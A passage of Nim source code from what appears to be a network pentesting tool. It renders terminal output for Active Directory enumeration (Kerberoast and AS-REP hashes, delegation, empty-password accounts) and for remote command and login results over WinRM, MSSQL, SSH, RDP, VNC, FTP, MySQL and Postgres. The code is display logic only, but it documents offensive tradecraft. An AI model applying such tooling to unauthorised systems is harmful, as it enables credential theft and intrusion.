    if node{"forest_functionality"}.getStr().len > 0:
      result.add "\n" & kv("forest fn", cyan(node["forest_functionality"].getStr()))
    if node["auth_attempted"].getBool():
      var displayUser = node["username"].getStr()
      var displayDomain = node{"auth_domain"}.getStr()
      if displayUser.len == 0:
        let krb = currentKerberosPrincipal()
        if krb.user.len > 0:
          displayUser = krb.user
        if displayDomain.len == 0 and krb.domain.len > 0:
          displayDomain = krb.domain
      let principal =
        if displayDomain.len > 0 and displayUser.len > 0:
          displayDomain & "\\" & displayUser
        elif displayUser.len > 0:
          displayUser
        else:
          ""
      if node["authenticated"].getBool():
        var line = green("authenticated")
        if principal.len > 0:
          line.add "  " & bold(principal)
        line.add credentialSuffix(node)
        result.add "\n" & kv("session", line)
      else:
        let diag = node{"bind_diagnostic"}.getStr()
        var line = red("fail")
        if principal.len > 0:
          line.add "  " & bold(principal)
        line.add "   " & dim("code " & $node["bind_result_code"].getInt())
        if diag.len > 0:
          let trimmed = if diag.len > 60: diag[0 ..< 60] & "..." else: diag
          line.add "  " & dim(trimmed)
        result.add "\n" & kv("session", line)
    elif node["anonymous"].getBool() and node["bind_result_code"].getInt() == 0:
      result.add "\n" & kv("session", yellow("anonymous"))
    if node["supported_sasl_mechanisms"].len > 0:
      var mechs: seq[string]
      for m in node["supported_sasl_mechanisms"]: mechs.add cyan(m.getStr())
      result.add "\n" & kv("sasl", mechs.join(dim(", ")))
    template section(label: string; count: int; body: untyped) =
      let header =
        if count >= 0: brightYellow(label) & " " & dim("(" & $count & ")")
        else: brightYellow(label)
      result.add "\n" & midBorder(header)
      body
    template row(text: string) =
      result.add "\n" & bodyLine("  " & text)
    proc firstValue(entry: JsonNode; attr: string): string =
      let a = entry{"attrs"}{attr}
      if a != nil and a.len > 0: a[0].getStr() else: ""
    proc entryLabel(entry: JsonNode; attrs: seq[string]): string =
      for attr in attrs:
        let value = firstValue(entry, attr)
        if value.len > 0:
          return value
      entry{"dn"}.getStr()
    proc allValues(entry: JsonNode; attr: string): seq[string] =
      let a = entry{"attrs"}{attr}
      if a != nil:
        for v in a: result.add v.getStr()
    if node.hasKey("users") and node["users"].len > 0:
      section("users", node["users"].len):
        for entry in node["users"]:
          let sam = firstValue(entry, "sAMAccountName")
          let display = firstValue(entry, "displayName")
          let upn = firstValue(entry, "userPrincipalName")
          let label =
            if display.len > 0: bold(sam) & dim("  " & display)
            elif upn.len > 0: bold(sam) & dim("  " & upn)
            else: bold(sam)
          row(label)
    if node.hasKey("groups") and node["groups"].len > 0:
      section("groups", node["groups"].len):
        for entry in node["groups"]:
          row(bold(entryLabel(entry, @["sAMAccountName", "cn", "name"])))
    if node.hasKey("computers") and node["computers"].len > 0:
      section("computers", node["computers"].len):
        for entry in node["computers"]:
          let dns = firstValue(entry, "dNSHostName")
          let sam = firstValue(entry, "sAMAccountName")
          let os = firstValue(entry, "operatingSystem")
          row(bold(if dns.len > 0 or sam.len > 0: entryLabel(entry, @["dNSHostName", "sAMAccountName", "cn", "name"]) else: entry{"dn"}.getStr()) & "  " & dim(os))
    if node.hasKey("asreproastable") and node["asreproastable"].len > 0:
      section("asreproast", node["asreproastable"].len):
        for entry in node["asreproastable"]:
          row(red("● ") & bold(firstValue(entry, "sAMAccountName")))
          if entry{"asrep_hash"}.getStr().len > 0:
            row("    " & brightCyan(entry{"asrep_hash"}.getStr()))
          elif entry{"asrep_error"}.getStr().len > 0:
            row("    " & red(entry{"asrep_error"}.getStr()))
    if node.hasKey("kerberoastable") and node["kerberoastable"].len > 0:
      section("kerberoast", node["kerberoastable"].len):
        for entry in node["kerberoastable"]:
          let sam = firstValue(entry, "sAMAccountName")
          let spns = allValues(entry, "servicePrincipalName")
          row(red("● ") & bold(sam))
          for spn in spns:
            row("    " & dim(spn))
          if entry{"tgs_hashes"}.kind == JArray:
            for h in entry["tgs_hashes"]:
              if h{"hash"}.getStr().len > 0:
                row("    " & brightCyan(h{"hash"}.getStr()))
              elif h{"error"}.getStr().len > 0:
                row("    " & red(h{"spn"}.getStr() & ": " & h{"error"}.getStr()))
    if node.hasKey("schema") and node["schema"].len > 0:
      section("schema", node["schema"].len):
        for entry in node["schema"]:
          let ldapName = firstValue(entry, "lDAPDisplayName")
          let cn = firstValue(entry, "cn")
          let attrSyntax = firstValue(entry, "attributeSyntax")
          let omSyntax = firstValue(entry, "oMSyntax")
          let label = if ldapName.len > 0: ldapName else: cn
          let syntax =
            if attrSyntax.len > 0 or omSyntax.len > 0:
              dim("  syntax " & attrSyntax & "/" & omSyntax)
            else: ""
          row(bold(label) & syntax)
    if node.hasKey("config") and node["config"].len > 0:
      section("configuration", node["config"].len):
        for entry in node["config"]:
          let cn = firstValue(entry, "cn")
          let name = firstValue(entry, "name")
          row(bold(if cn.len > 0: cn else: name) & "  " & dim(entry{"dn"}.getStr()))
    if node.hasKey("fgpp") and node["fgpp"].len > 0:
      section("fine-grained password policies", node["fgpp"].len):
        for entry in node["fgpp"]:
          row(bold(firstValue(entry, "cn")) &
            dim("  precedence " & firstValue(entry, "msDS-PasswordSettingsPrecedence")))
    if node.hasKey("deleted") and node["deleted"].len > 0:
      section("deleted objects", node["deleted"].len):
        for entry in node["deleted"]:
          row(red("● ") & bold(firstValue(entry, "cn")) & "  " & dim(entry{"dn"}.getStr()))
    if node.hasKey("locked") and node["locked"].len > 0:
      section("locked users", node["locked"].len):
        for entry in node["locked"]:
          row(red("● ") & bold(firstValue(entry, "sAMAccountName")) &
            dim("  badPwdCount " & firstValue(entry, "badPwdCount")))
    if node.hasKey("expired_passwords") and node["expired_passwords"].len > 0:
      section("expired passwords", node["expired_passwords"].len):
        for entry in node["expired_passwords"]:
          row(red("● ") & bold(firstValue(entry, "sAMAccountName")))
    if node.hasKey("stale_users") and node["stale_users"].len > 0:
      section("stale users", node["stale_users"].len):
        for entry in node["stale_users"]:
          row(yellow("● ") & bold(firstValue(entry, "sAMAccountName")) &
            dim("  " & firstValue(entry, "lastLogonTimestamp")))
    if node.hasKey("never_logged_on") and node["never_logged_on"].len > 0:
      section("never logged on", node["never_logged_on"].len):
        for entry in node["never_logged_on"]:
          row(yellow("● ") & bold(firstValue(entry, "sAMAccountName")))
    if node.hasKey("unconstrained") and node["unconstrained"].len > 0:
      section("unconstrained delegation", node["unconstrained"].len):
        for entry in node["unconstrained"]:
          let sam = firstValue(entry, "sAMAccountName")
          let dns = firstValue(entry, "dNSHostName")
          row(red("● ") & bold(if dns.len > 0: dns else: sam))
    if node.hasKey("constrained") and node["constrained"].len > 0:
      section("constrained delegation", node["constrained"].len):
        for entry in node["constrained"]:
          let sam = firstValue(entry, "sAMAccountName")
          let targets = entry{"attrs"}{"msDS-AllowedToDelegateTo"}
          var targetList: seq[string]
          if targets != nil and targets.kind == JArray:
            for t in targets: targetList.add t.getStr()
          row(yellow("● ") & bold(sam) & "  " & dim(targetList.join(", ")))
    if node.hasKey("rbcd_targets") and node["rbcd_targets"].len > 0:
      section("rbcd targets", node["rbcd_targets"].len):
        for entry in node["rbcd_targets"]:
          let sam = firstValue(entry, "sAMAccountName")
          let dns = firstValue(entry, "dNSHostName")
          row(yellow("● ") & bold(if dns.len > 0: dns else: sam))
    if node.hasKey("passwd_notreqd") and node["passwd_notreqd"].len > 0:
      section("passwd not required", node["passwd_notreqd"].len):
        for entry in node["passwd_notreqd"]:
          let sam = firstValue(entry, "sAMAccountName")
          let emptyPwd = entry{"empty_password"}
          let emptyStr =
            if emptyPwd != nil and emptyPwd.getBool(): "  " & brightGreen("empty password works!")
            elif emptyPwd != nil: "  " & dim("empty password: no")
            else: ""
          row(red("● ") & bold(sam) & emptyStr)
    if node.hasKey("dont_expire") and node["dont_expire"].len > 0:
      section("password never expires", node["dont_expire"].len):
        for entry in node["dont_expire"]:
          row(yellow("● ") & bold(firstValue(entry, "sAMAccountName")) &
            dim("  " & firstValue(entry, "pwdLastSet")))
    if node.hasKey("admin_count") and node["admin_count"].len > 0:
      section("admincount=1", node["admin_count"].len):
        for entry in node["admin_count"]:
          row(red("● ") & bold(firstValue(entry, "sAMAccountName")))
    if node.hasKey("sites") and node["sites"].len > 0:
      section("sites", node["sites"].len):
        for entry in node["sites"]:
          row(bold(firstValue(entry, "cn")) & "  " & dim(entry{"dn"}.getStr()))
    if node.hasKey("subnets") and node["subnets"].len > 0:
      section("subnets", node["subnets"].len):
        for entry in node["subnets"]:
          row(bold(firstValue(entry, "cn")) & "  " & dim(firstValue(entry, "siteObject")))
    if node.hasKey("dcs") and node["dcs"].len > 0:
      section("domain controllers", node["dcs"].len):
        for entry in node["dcs"]:
          let dns = firstValue(entry, "dNSHostName")
          let sam = firstValue(entry, "sAMAccountName")
          let os = firstValue(entry, "operatingSystem")
          row(magenta("● ") & bold(if dns.len > 0: dns else: sam) & "  " & dim(os))
    if node.hasKey("admins") and node["admins"].len > 0:
      section("privileged members", node["admins"].len):
        for entry in node["admins"]:
          let sam = firstValue(entry, "sAMAccountName")
          let group = firstValue(entry, "adminOf")
          row(red("● ") & bold(sam) & "  " & dim("(in " & group & ")"))
    if node.hasKey("trusts") and node["trusts"].len > 0:
      section("trusts", node["trusts"].len):
        for entry in node["trusts"]:
          let partner = firstValue(entry, "trustPartner")
          let direction = firstValue(entry, "trustDirection")
          let trustType = firstValue(entry, "trustType")
          let dirName = case direction
            of "1": "inbound"
            of "2": "outbound"
            of "3": "bidirectional"
            else: direction
          row(bold(partner) & "  " & dim("dir=" & dirName & "  type=" & trustType))
    if node.hasKey("gpos") and node["gpos"].len > 0:
      section("group policies", node["gpos"].len):
        for entry in node["gpos"]:
          let name = firstValue(entry, "displayName")
          let cn = firstValue(entry, "cn")
          row(bold(if name.len > 0: name else: cn) & "  " & dim(cn))
    if node.hasKey("dns_zones") and node["dns_zones"].len > 0:
      section("dns zones", node["dns_zones"].len):
        for entry in node["dns_zones"]:
          let name = firstValue(entry, "name")
          let dc = firstValue(entry, "dc")
          row(bold(if name.len > 0: name else: dc))
    if node.hasKey("certificate_inventory") and node["certificate_inventory"].len > 0:
      section("certificate inventory", node["certificate_inventory"].len):
        for entry in node["certificate_inventory"]:
          var methods: seq[string]
          let m = entry{"mapping_methods"}
          if m != nil and m.kind == JArray:
            for item in m: methods.add item.getStr()
          let certCount = entry{"certificate_count"}.getInt()
          let keyCredCount = entry{"key_credential_count"}.getInt()
          var counts: seq[string]
          if certCount > 0: counts.add "certs=" & $certCount
          if keyCredCount > 0: counts.add "keycreds=" & $keyCredCount
          row(bold(entry{"account"}.getStr()) & "  " &
            dim(methods.join(",") & (if counts.len > 0: "  " & counts.join(" ") else: "")))
          let alts = entry{"alt_security_identities"}
          if alts != nil and alts.kind == JArray:
            for alt in alts:
              row("    " & dim(alt.getStr()))
    if node.hasKey("custom") and node["custom"].len > 0:
      section("custom query", node["custom"].len):
        for entry in node["custom"]:
          row(bold(entry{"dn"}.getStr()))
          if entry.hasKey("attrs"):
            for key, values in entry["attrs"]:
              if values.len == 0: continue
              var rendered: seq[string]
              for value in values:
                let text = value.getStr()
                rendered.add if text.len > 120: text[0 ..< 120] & "..." else: text
              row(dim("    " & key & ": ") & rendered.join(dim(", ")))
    result.add "\n" & bottomBorder()
    return
  of "winrm":
    const BoxWidth = 78
    proc visibleLen(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm':
            inc i
          if i < text.len: inc i
        else:
          inc result
          inc i
    proc padR(text: string; width: int): string =
      let v = visibleLen(text)
      if v >= width: text else: text & repeat(' ', width - v)
    proc topBorder(label: string): string =
      let head = "┌─ " & label & " "
      let pad = max(3, BoxWidth - visibleLen(head))
      gray("┌─ ") & label & gray(" " & repeat("─", pad))
    proc midBorder(label: string): string =
      let head = "├─ " & label & " "
      let pad = max(3, BoxWidth - visibleLen(head))
      gray("├─ ") & label & gray(" " & repeat("─", pad))
    proc bottomBorder(): string = gray("└" & repeat("─", BoxWidth - 1))
    proc bodyLine(text: string): string = gray("│  ") & text
    proc kv(label, value: string): string =
      bodyLine(padR(dim(label), 11) & value)
    let titleText = bold("WINRM") & "  " & brightCyan(host & ":" & $port)
    result = topBorder(titleText)
    let state =
      if node["speaks_winrm"].getBool(): green("listening")
      elif node["reachable"].getBool(): yellow("open")
      else: red("down")
    result.add "\n" & kv("status", state)
    if node.hasKey("status_code") and node["status_code"].getInt() != 0:
      result.add "\n" & kv("http", brightCyan($node["status_code"].getInt()))
    if node{"auth_header"}.getStr().len > 0:
      result.add "\n" & kv("auth-hdr", dim(node["auth_header"].getStr()))
    if node{"server_header"}.getStr().len > 0:
      result.add "\n" & kv("server", dim(node["server_header"].getStr()))
    if node.hasKey("authenticated") and node{"username"}.getStr().len > 0:
      let principal =
        if node{"auth_domain"}.getStr().len > 0:
          node{"auth_domain"}.getStr() & "\\" & node{"username"}.getStr()
        else: node{"username"}.getStr()
      if node["authenticated"].getBool():
        result.add "\n" & kv("session",
          green("authenticated") & "  " & bold(principal) & credentialSuffix(node))
      else:
        result.add "\n" & kv("session",
          red("fail") & "  " & bold(principal) & "   " &
          dim(node["message"].getStr()))
    if node.hasKey("command"):
      result.add "\n" & midBorder(brightYellow("command output"))
      result.add "\n" & bodyLine(dim("$ ") & node["command"].getStr())
      for line in node{"output"}.getStr().splitLines():
        if line.len > 0:
          result.add "\n" & bodyLine("  " & line)
    result.add "\n" & bottomBorder()
    return
  of "mssql":
    const BoxWidth = 78
    proc visibleLenM(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else:
          inc result; inc i
    proc padRm(text: string; width: int): string =
      let v = visibleLenM(text)
      if v >= width: text else: text & repeat(' ', width - v)
    proc topB(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidth - visibleLenM(head))))
    proc midB(label: string): string =
      let head = "├─ " & label & " "
      gray("├─ ") & label & gray(" " & repeat("─", max(3, BoxWidth - visibleLenM(head))))
    proc botB(): string = gray("└" & repeat("─", BoxWidth - 1))
    proc body(text: string): string = gray("│  ") & text
    proc kvm(label, value: string): string = body(padRm(dim(label), 11) & value)
    proc cleanCell(text: string): string =
      for ch in text:
        case ch
        of '\r': discard
        of '\n', '\t': result.add ' '
        else:
          if ord(ch) >= 32: result.add ch
    proc clipCell(text: string; maxLen: int): string =
      let s = cleanCell(text)
      if s.len <= maxLen: return s
      let suffix = "...+" & $(s.len - maxLen)
      let keep = max(1, maxLen - suffix.len)
      s[0 ..< keep] & dim(suffix)
    let titleM = bold("MSSQL") & "  " & brightCyan(host & ":" & $port)
    result = topB(titleM)
    let state =
      if node["speaks_mssql"].getBool(): green("listening")
      elif node["reachable"].getBool(): yellow("open")
      else: red("down")
    result.add "\n" & kvm("status", state &
      "  " & dim("encrypt=" & $node["encryption_mode"].getInt()))
    if node{"version"}.getStr().len > 0:
      result.add "\n" & kvm("version", brightCyan(node["version"].getStr()))
    if node.hasKey("kerberos"):
      let krb = node["kerberos"]
      result.add "\n" & kvm("kerberos", dim("spn ") & brightCyan(krb{"spn"}.getStr()))
      if krb{"principal"}.getStr().len > 0:
        result.add "\n" & kvm("principal", bold(krb{"principal"}.getStr()))
      if krb{"cache_source"}.getStr().len > 0:
        result.add "\n" & kvm("cache", dim(krb{"cache_source"}.getStr()))
      if krb{"ccache"}.getStr().len > 0:
        result.add "\n" & kvm("ccache", dim(krb{"ccache"}.getStr()))
    if node.hasKey("authenticated"):
      let principal = node{"username"}.getStr()
      if node["authenticated"].getBool():
        result.add "\n" & kvm("auth",
          green("authenticated") & "  " &
          bold(if principal.len > 0: principal else: "sql-user") & credentialSuffix(node))
        if node{"server_version"}.getStr().len > 0:
          result.add "\n" & kvm("server", magenta(node["server_version"].getStr()))
      else:
        let authErr = node{"auth_error"}.getStr()
        result.add "\n" & kvm("auth", red("fail") &
          (if authErr.len > 0: "  " & dim(authErr) else: ""))
    template renderExecOrQuery(key, label: string) =
      if node.hasKey(key):
        let r = node[key]
        let title = if r["success"].getBool(): green(label) else: red(label & " failed")
        result.add "\n" & midB(brightYellow(title))
        if r{"server_version"}.getStr().len > 0:
          result.add "\n" & kvm("server", dim(r["server_version"].getStr()))
        for m in r["messages"]:
          let prefix = if m["is_error"].getBool(): red("● ") else: yellow("● ")
          result.add "\n" & body("  " & prefix &
            dim("[" & $m["number"].getInt() & "/sev" & $m["severity"].getInt() & "] ") &
            m["text"].getStr())
        for rs in r["result_sets"]:
          let cols = rs["columns"]
          let rows = rs["rows"]
          if rows.len == 0: continue
          if cols.len == 1:
            let colName = cols[0].getStr()
            if colName.len > 0:
              result.add "\n" & body("  " & dim(colName))
            for row in rows:
              if row.len == 0:
                continue
              let value = row[0].getStr()
              if value.len == 0:
                continue
              for line in value.splitLines():
                result.add "\n" & body("  " & line)
            continue
          if cols.len * 26 > BoxWidth - 4:
            var rowNo = 0
            for row in rows:
              inc rowNo
              result.add "\n" & body("  " & dim("row " & $rowNo))
              for i in 0 ..< cols.len:
                if i >= row.len: continue
                let value = cleanCell(row[i].getStr())
                if value.len == 0: continue
                let name = clipCell(cols[i].getStr(), 22)
                result.add "\n" & body("    " & padRm(dim(name), 24) &
                  clipCell(value, BoxWidth - 32))
            continue
          var header = ""
          for col in cols:
            header.add padRm(dim(clipCell(col.getStr(), 24)), 26)
          result.add "\n" & body("  " & header)
          for row in rows:
            var line = ""
            for cell in row:
              line.add padRm(clipCell(cell.getStr(), 24), 26)
            result.add "\n" & body("  " & line)
        if r{"error"}.getStr().len > 0 and not r["success"].getBool():
          result.add "\n" & body("  " & red("error: ") & r["error"].getStr())
    if node.hasKey("exec") and node["exec"].hasKey("method"):
      let execMethod = node["exec"]["method"].getStr()
      let label =
        case execMethod
        of "ole": "ole output"
        of "clr": "clr output"
        else: "xp_cmdshell output"
      renderExecOrQuery("exec", label)
    else:
      renderExecOrQuery("exec", "xp_cmdshell output")
    renderExecOrQuery("query", "query results")
    result.add "\n" & botB()
    return
  of "rdp":
    const BoxWidth = 78
    proc visibleLenR(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc padRR(text: string; width: int): string =
      let v = visibleLenR(text)
      if v >= width: text else: text & repeat(' ', width - v)
    proc topBorderR(label: string): string =
      let head = "┌─ " & label & " "
      let pad = max(3, BoxWidth - visibleLenR(head))
      gray("┌─ ") & label & gray(" " & repeat("─", pad))
    proc bottomBorderR(): string = gray("└" & repeat("─", BoxWidth - 1))
    proc bodyLineR(text: string): string = gray("│  ") & text
    proc kvR(label, value: string): string =
      bodyLineR(padRR(dim(label), 11) & value)
    let titleText = bold("RDP") & "  " & brightCyan(host & ":" & $port)
    result = topBorderR(titleText)
    let speaksRdp = node["speaks_rdp"].getBool()
    let reachable = node["reachable"].getBool()
    let state =
      if speaksRdp: green("listening")
      elif reachable: yellow("open")
      else: red("down")
    result.add "\n" & kvR("status", state)
    if speaksRdp:
      let sel = node["selected_protocol"].getInt()
      let protoName =
        if (sel and 2) != 0: brightCyan("CredSSP") & dim(" (NLA)")
        elif (sel and 1) != 0: brightCyan("TLS")
        else: dim("standard RDP")
      result.add "\n" & kvR("protocol", protoName)
    if node["auth_checked"].getBool():
      let user = node{"username"}.getStr()
      let dom = node{"auth_domain"}.getStr()
      let principal =
        if dom.len > 0: bold(dom & "\\" & user)
        elif user.len > 0: bold(user)
        else: ""
      if node["authenticated"].getBool():
        let line = green("ok") & (if principal.len > 0: "  " & principal else: "") &
          credentialSuffix(node)
        result.add "\n" & kvR("session", line)
      else:
        let line = red("fail") & (if principal.len > 0: "  " & principal else: "")
        result.add "\n" & kvR("session", line)
    result.add "\n" & bottomBorderR()
    return
  of "ssh":
    const BoxWidthSsh = 78
    proc visLenS(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topS(label: string): string =
      let pad = max(3, BoxWidthSsh - visLenS("┌─ " & label & " "))
      gray("┌─ ") & label & gray(" " & repeat("─", pad))
    proc midS(label: string): string =
      let pad = max(3, BoxWidthSsh - visLenS("├─ " & label & " "))
      gray("├─ ") & label & gray(" " & repeat("─", pad))
    proc botS(): string = gray("└" & repeat("─", BoxWidthSsh - 1))
    proc bodyS(text: string): string = gray("│  ") & text
    proc padRS(text: string; w: int): string =
      let v = visLenS(text)
      if v >= w: text else: text & repeat(' ', w - v)
    proc kvS(label, value: string): string = bodyS(padRS(dim(label), 11) & value)
    let title = bold("SSH") & "  " & brightCyan(host & ":" & $port)
    result = topS(title)
    let reachable = node["reachable"].getBool()
    let state = if reachable: green("listening") else: red("down")
    result.add "\n" & kvS("status", state)
    let banner = node{"banner"}.getStr()
    if banner.len > 0:
      result.add "\n" & kvS("banner", dim(banner))
    let authed = node["authenticated"].getBool()
    let username = node{"username"}.getStr()
    if username.len > 0:
      let isRoot = node{"is_root"}.getBool()
      let prompt = if isRoot: bold(red("#")) else: bold(green("$"))
      if authed:
        result.add "\n" & kvS("session",
          green("authenticated") & "  " & bold(username) & credentialSuffix(node) &
          "  " & prompt)
      else:
        let msg = node{"auth_message"}.getStr()
        result.add "\n" & kvS("session",
          red("fail") & "  " & bold(username) &
          (if msg.len > 0: "  " & dim(msg) else: ""))
    let cmdOut = node{"output"}.getStr()
    let cmdErr = node{"stderr"}.getStr()
    if cmdOut.len > 0 or cmdErr.len > 0:
      result.add "\n" & midS("output")
      for line in cmdOut.splitLines():
        if line.len > 0:
          result.add "\n" & bodyS(line)
      for line in cmdErr.splitLines():
        if line.len > 0:
          result.add "\n" & bodyS(dim(line))
    result.add "\n" & botS()
    return
  of "vnc":
    const BoxWidthVnc = 78
    proc visLenV(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topV(label: string): string =
      let pad = max(3, BoxWidthVnc - visLenV("┌─ " & label & " "))
      gray("┌─ ") & label & gray(" " & repeat("─", pad))
    proc botV(): string = gray("└" & repeat("─", BoxWidthVnc - 1))
    proc bodyV(text: string): string = gray("│  ") & text
    proc padRV(text: string; w: int): string =
      let v = visLenV(text)
      if v >= w: text else: text & repeat(' ', w - v)
    proc kvV(label, value: string): string = bodyV(padRV(dim(label), 11) & value)
    let title = bold("VNC") & "  " & brightCyan(host & ":" & $port)
    result = topV(title)
    let reachable = node["reachable"].getBool()
    let state = if reachable: green("listening") else: red("down")
    result.add "\n" & kvV("status", state)
    let rfbVer = node{"rfb_version"}.getStr()
    if rfbVer.len > 0:
      result.add "\n" & kvV("version", dim(rfbVer))
    let secTypes = node{"security_types"}
    if secTypes != nil and secTypes.len > 0:
      var types: seq[string]
      for t in secTypes:
        case t.getInt()
        of 1: types.add "None"
        of 2: types.add "VNC-Auth"
        else: types.add $t.getInt()
      result.add "\n" & kvV("security", dim(types.join(", ")))
    let desktop = node{"desktop_name"}.getStr()
    if desktop.len > 0:
      result.add "\n" & kvV("desktop", brightCyan(desktop))
    let authed = node["authenticated"].getBool()
    if authed:
      result.add "\n" & kvV("auth", green("authenticated") & credentialSuffix(node))
    else:
      let msg = node{"auth_message"}.getStr()
      if msg.len > 0:
        result.add "\n" & kvV("auth", red("fail") & "  " & dim(msg))
      elif reachable:
        result.add "\n" & kvV("auth", dim("not attempted"))
    result.add "\n" & botV()
    return
  of "ftp":
    const BoxWidthFtp = 78
    proc visLenF(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topF(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthFtp - visLenF("┌─ " & label & " "))))
    proc botF(): string = gray("└" & repeat("─", BoxWidthFtp - 1))
    proc bodyF(text: string): string = gray("│  ") & text
    proc kvF(label, value: string): string =
      bodyF(label & repeat(' ', max(1, 11 - visLenF(label))) & value)
    let titleF = bold("FTP") & "  " & brightCyan(host & ":" & $port)
    result = topF(titleF)
    let reachF = node["reachable"].getBool()
    result.add "\n" & kvF(dim("status"), if reachF: green("listening") else: red("down"))
    if node{"banner"}.getStr().len > 0:
      result.add "\n" & kvF(dim("banner"), dim(node["banner"].getStr()))
    if node{"system"}.getStr().len > 0:
      result.add "\n" & kvF(dim("system"), dim(node["system"].getStr()))
    let feats = node{"features"}
    if feats != nil and feats.len > 0:
      var fs: seq[string]
      for f in feats: fs.add f.getStr()
      result.add "\n" & kvF(dim("features"), dim(fs.join("  ")))
    let authedF = node["authenticated"].getBool()
    let userF = node{"username"}.getStr()
    if userF.len > 0:
      if authedF:
        let anonTag = if node{"anonymous"}.getBool(): dim("  anonymous") else: ""
        result.add "\n" & kvF(dim("session"),
          green("authenticated") & "  " & bold(userF) & credentialSuffix(node) & anonTag)
      else:
        let msg = node{"auth_message"}.getStr()
        result.add "\n" & kvF(dim("session"),
          red("fail") & "  " & bold(userF) & (if msg.len > 0: "  " & dim(msg) else: ""))
    let listingF = node{"listing"}
    if listingF != nil and listingF.len > 0:
      for entry in listingF:
        result.add "\n" & bodyF(dim(entry.getStr()))
    result.add "\n" & botF()
    return
  of "mysql":
    const BoxWidthMy = 78
    proc visLenM(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topM(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthMy - visLenM("┌─ " & label & " "))))
    proc botM(): string = gray("└" & repeat("─", BoxWidthMy - 1))
    proc bodyM(text: string): string = gray("│  ") & text
    proc kvM(label, value: string): string =
      bodyM(label & repeat(' ', max(1, 11 - visLenM(label))) & value)
    let titleM = bold("MYSQL") & "  " & brightCyan(host & ":" & $port)
    result = topM(titleM)
    let reachM = node["reachable"].getBool()
    result.add "\n" & kvM(dim("status"), if reachM: green("listening") else: red("down"))
    if node{"server_version"}.getStr().len > 0:
      result.add "\n" & kvM(dim("version"), dim(node["server_version"].getStr()))
    if node{"auth_plugin"}.getStr().len > 0:
      result.add "\n" & kvM(dim("plugin"), dim(node["auth_plugin"].getStr()))
    let authedM = node["authenticated"].getBool()
    let userM = node{"username"}.getStr()
    if userM.len > 0:
      if authedM:
        let cu = node{"current_user"}.getStr()
        let cuTag = if cu.len > 0: "  " & dim(cu) else: ""
        result.add "\n" & kvM(dim("session"),
          green("authenticated") & "  " & bold(userM) & credentialSuffix(node) & cuTag)
      else:
        let msg = node{"auth_message"}.getStr()
        result.add "\n" & kvM(dim("session"),
          red("fail") & "  " & bold(userM) & (if msg.len > 0: "  " & dim(msg) else: ""))
    let dbs = node{"databases"}
    if dbs != nil and dbs.len > 0:
      var dbNames: seq[string]
      for d in dbs: dbNames.add d.getStr()
      result.add "\n" & kvM(dim("databases"), brightCyan(dbNames.join("  ")))
    result.add "\n" & botM()
    return
  of "postgres":
    const BoxWidthPg = 78
    proc topPg(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthPg - visibleLenAnsi("┌─ " & label & " "))))
    proc botPg(): string = gray("└" & repeat("─", BoxWidthPg - 1))
    proc bodyPg(text: string): string = gray("│  ") & text
    proc kvPg(label, value: string): string =
      bodyPg(label & repeat(' ', max(1, 11 - visibleLenAnsi(label))) & value)
    let sslTagPg = if node["ssl"].getBool(): brightCyan("s") else: ""
    let titlePg = bold("POSTGRES") & sslTagPg & "  " & brightCyan(host & ":" & $port)
    result = topPg(titlePg)
    let reachPg = node["reachable"].getBool()
    result.add "\n" & kvPg(dim("status"), if reachPg: green("listening") else: red("down"))
    if node{"server_version"}.getStr().len > 0:
      result.add "\n" & kvPg(dim("version"), dim(node["server_version"].getStr()))
    let userPg = node{"username"}.getStr()
    if userPg.len > 0:
      if node["authenticated"].getBool():
        let ctx = node{"current_user"}.getStr()
        let db = node{"current_database"}.getStr()
        let ctxTag = if ctx.len > 0 and ctx != userPg: "  " & dim(ctx) else: ""
        let dbTag = if db.len > 0: "  " & brightCyan(db) else: ""
        result.add "\n" & kvPg(dim("session"),
          green("authenticated") & "  " & bold(userPg) & credentialSuffix(node) & ctxTag & dbTag)
      else:
        result.add "\n" & kvPg(dim("session"), red("fail") & "  " & bold(userPg) &
          (if node{"auth_message"}.getStr().len > 0: "  " & dim(node["auth_message"].getStr()) else: ""))
    let dbsPg = node{"databases"}
    if dbsPg != nil and dbsPg.len > 0:
      var dbNames: seq[string]
      for d in dbsPg: dbNames.add brightCyan(d.getStr())
      result.add "\n" & kvPg(dim("databases"), dbNames.join(dim("  ")))
    if node.hasKey("query"):
      if node{"query_error"}.getStr().len > 0:
        result.add "\n" & kvPg(dim("query"), red(node["query_error"].getStr()))
      else:
        let qrows = node{"rows"}
        let qcols = node{"columns"}
        if qcols != nil and qcols.len > 0:
          result.add "\n" & kvPg(dim("query"), brightGreen((if qrows != nil: $qrows.len else: "0") & " row(s)"))
    if node.hasKey("exec"):
      let ex = node["exec"]
      if ex{"ok"}.getBool():
        result.add "\n" & kvPg(dim("exec"), green("ok") & "  " & dim(ex{"command"}.getStr()))
      else:
        result.add "\n" & kvPg(dim("exec"), red("fail") & "  " & dim(ex{"error"}.getStr()))
    result.add "\n" & botPg()
    if node.hasKey("query") and node{"query_error"}.getStr().len == 0:
